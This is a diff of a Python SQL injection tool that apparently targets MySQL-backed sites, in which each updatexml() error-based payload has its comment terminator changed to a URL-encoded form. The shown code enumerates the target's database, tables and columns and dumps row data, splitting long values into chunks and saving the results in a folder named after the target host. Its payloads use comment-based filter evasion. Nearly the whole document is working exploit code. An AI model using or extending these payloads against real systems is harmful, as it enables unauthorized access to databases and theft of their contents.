@@ -179,7 +179,7 @@ class udpatexml_get():
             [string]: [返回获得数据库]
         """             
         print('start database')
-        sql_database = r'%20and%20(updatexml(1,concat(0x7e,(select/**/database()%20limit%200,1),0x7e),1))--%20 #'
+        sql_database = r'%20and%20(updatexml(1,concat(0x7e,(select/**/database()%20limit%200,1),0x7e),1))--%20+%23'
         res_body = self.request_req(sql_database)
         database_re = re.search(r'XPATH syntax error:.*~', res_body, re.M | re.I)
         current_database = database_re.group(0).replace(r"XPATH syntax error: '~",'').replace(r"~", "")
@@ -198,7 +198,7 @@ class udpatexml_get():
         print('start Table')
         database_hex = str_to_hexStr(database)
         tables = []
-        sql_table_count = r'%20and%20(updatexml(1,concat(0x7e,(select/**/count(table_name)/*!11440from*//**/information_schema.tables/**/where/**/table_schema={}%20limit%200,1),0x7e),1))--%20 #'.format(database_hex)
+        sql_table_count = r'%20and%20(updatexml(1,concat(0x7e,(select/**/count(table_name)/*!11440from*//**/information_schema.tables/**/where/**/table_schema={}%20limit%200,1),0x7e),1))--%20+%23'.format(database_hex)
         res_body = self.request_req(sql_table_count)
         count_table_re = re.search(r'XPATH syntax error:.*~', res_body, re.M | re.I)
         try:
@@ -209,7 +209,7 @@ class udpatexml_get():
         print('Table_count: ' + str(count_table))
         if int(count_table) != 0:
             for i in range(int(count_table)):
-                sql_table = r'%20and%20(updatexml(1,concat(0x7e,(select/**/table_name/*!11440from*//**/information_schema.tables/**/where/**/table_schema={}%20limit%20{},1),0x7e),1))--%20 #'.format(database_hex, i)
+                sql_table = r'%20and%20(updatexml(1,concat(0x7e,(select/**/table_name/*!11440from*//**/information_schema.tables/**/where/**/table_schema={}%20limit%20{},1),0x7e),1))--%20+%23'.format(database_hex, i)
                 res_table_body = self.request_req(sql_table)
                 columns_re = re.search(r'XPATH syntax error:.*~', res_table_body, re.M | re.I)
                 try:
@@ -235,7 +235,7 @@ class udpatexml_get():
         print('start column')
         tablename_hex = str_to_hexStr(tablename)
         columns = []
-        sql_columns_count = r'%20and%20(updatexml(1,concat(0x7e,(select/**/count(column_name)/*!11440from*//**/information_schema.columns/**/where/**/table_name={}%20limit%200,1),0x7e),1))--%20 #'.format(tablename_hex)
+        sql_columns_count = r'%20and%20(updatexml(1,concat(0x7e,(select/**/count(column_name)/*!11440from*//**/information_schema.columns/**/where/**/table_name={}%20limit%200,1),0x7e),1))--%20+%23'.format(tablename_hex)
         res_body = self.request_req(sql_columns_count)
         count_col_re = re.search(r'XPATH syntax error:.*~', res_body, re.M | re.I)
         try:
@@ -246,7 +246,7 @@ class udpatexml_get():
         print('Columns_Count: ' + str(count_col))
         if int(count_col) != 0:
             for i in range(int(count_col)):
-                sql_column = r'%20and%20(updatexml(1,concat(0x7e,(select/**/column_name/*!11440from*//**/information_schema.columns/**/where/**/table_name={}%20limit%20{},1),0x7e),1))--%20 #'.format(tablename_hex,i)
+                sql_column = r'%20and%20(updatexml(1,concat(0x7e,(select/**/column_name/*!11440from*//**/information_schema.columns/**/where/**/table_name={}%20limit%20{},1),0x7e),1))--%20+%23'.format(tablename_hex,i)
                 res_col_body = self.request_req(sql_column)
                 columns_re = re.search(r'XPATH syntax error:.*~', res_col_body, re.M | re.I)
                 try:
@@ -275,7 +275,7 @@ class udpatexml_get():
         os.mkdir(dirpath.netloc)  #创建文件夹存放数据，文件夹名是hostname
         data_total = [] # 全部数据
         data = {} # 单条数据
-        sql_data = r'%20and%20(updatexml(1,concat(0x7e,(select/**/count(*)/*!11440from*//**/{}%20limit%200,1),0x7e),1))--%20 #'.format(tablename)
+        sql_data = r'%20and%20(updatexml(1,concat(0x7e,(select/**/count(*)/*!11440from*//**/{}%20limit%200,1),0x7e),1))--%20+%23'.format(tablename)
         res_body = self.request_req(sql_data)
         count_data_re = re.search(r'XPATH syntax error:.*~', res_body, re.M | re.I)
         try:
@@ -289,7 +289,7 @@ class udpatexml_get():
             for i in range(int(count_data)):
                 for column in columns:
                     # sql语句判断了数据的长度，如果数据长度超过30则返回字符串‘t00long’，如果小于30 则直接输出数据
-                    sql_data = r'%20and%20(updatexml(1,concat(0x7e,(select/**/if(length({})/**/not/**/between/**/0/**/and/**/30,0x7430306c6f6e67, {})/*!11440from*//**/{}%20limit%20{},1),0x7e),1))--%20 #'.format(column, column, tablename, i)
+                    sql_data = r'%20and%20(updatexml(1,concat(0x7e,(select/**/if(length({})/**/not/**/between/**/0/**/and/**/30,0x7430306c6f6e67, {})/*!11440from*//**/{}%20limit%20{},1),0x7e),1))--%20+%23'.format(column, column, tablename, i)
                     res_data_body = self.request_req(sql_data)
                     data_re = re.search(r'XPATH syntax error:.*~', res_data_body, re.M | re.I)
                     try:
@@ -300,7 +300,7 @@ class udpatexml_get():
                         break
                     if data_get == 't00long':
                         # 当数据过长的时候，查询字段长度
-                        sql_data_len = r'%20and%20(updatexml(1,concat(0x7e,(select/**/length({})/*!11440from*//**/{}%20limit%20{},1),0x7e),1))--%20 #'.format(column, tablename,i)
+                        sql_data_len = r'%20and%20(updatexml(1,concat(0x7e,(select/**/length({})/*!11440from*//**/{}%20limit%20{},1),0x7e),1))--%20+%23'.format(column, tablename,i)
                         res_data_getlen_body = self.request_req(sql_data_len)
                         res_data_getlen_re = re.search(r'XPATH syntax error:.*~', res_data_getlen_body, re.M | re.I)
                         try:
@@ -313,7 +313,7 @@ class udpatexml_get():
                         res_str = ''
                         # 分段获取过长数据
                         for j in cut:
-                            sql_data_col_len = r'%20and%20(updatexml(1,concat(0x7e,(select/**/substr({},{},{})/*!11440from*//**/{}%20limit%20{},1),0x7e),1))--%20 #'.format(column, j[0], j[1],tablename,i)
+                            sql_data_col_len = r'%20and%20(updatexml(1,concat(0x7e,(select/**/substr({},{},{})/*!11440from*//**/{}%20limit%20{},1),0x7e),1))--%20+%23'.format(column, j[0], j[1],tablename,i)
                             res_data_len_body = self.request_req(sql_data_col_len)
                             data_re_len = re.search(r'XPATH syntax error:.*~', res_data_len_body , re.M | re.I)
                             try:
